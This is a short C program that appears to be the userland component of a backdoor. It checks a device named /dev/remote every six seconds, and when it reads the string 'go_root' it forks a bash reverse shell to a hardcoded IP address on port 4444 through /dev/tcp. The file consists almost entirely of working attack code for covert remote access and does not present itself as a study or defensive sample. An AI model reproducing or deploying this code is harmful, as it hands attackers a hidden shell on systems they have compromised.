#include <stdio.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioccom.h>
#include <stdlib.h>
#include <unistd.h>

void evil()
{

	int res = fork();
	if (res == 0)
	{
		printf("Launching shell\n");
		execl("/usr/local/bin/bash", "/usr/local/bin/bash", 
				"-c", "bash -i >& /dev/tcp/172.18.68.58/4444 0>&1", NULL);
	}
}

void execute()
{
	int fd; 
	char cmd[512 + 1];

	if ((fd = open("/dev/remote", O_RDWR)) == -1)
	{
		printf("file not found\n");
		exit(-1);
	}

	if (read(fd, cmd, 512) == -1)
	{
		printf("read failed\n");
		exit(-1);	
	}


	if (strncmp("go_root", cmd, 7) == 0)
	{
		//printf("%s\n", cmd);
		bzero(cmd, 256);
		evil();
	}
}

int main()
{

	while(1) 
	{
		execute();
		sleep(6);
	}


	exit(0);
}


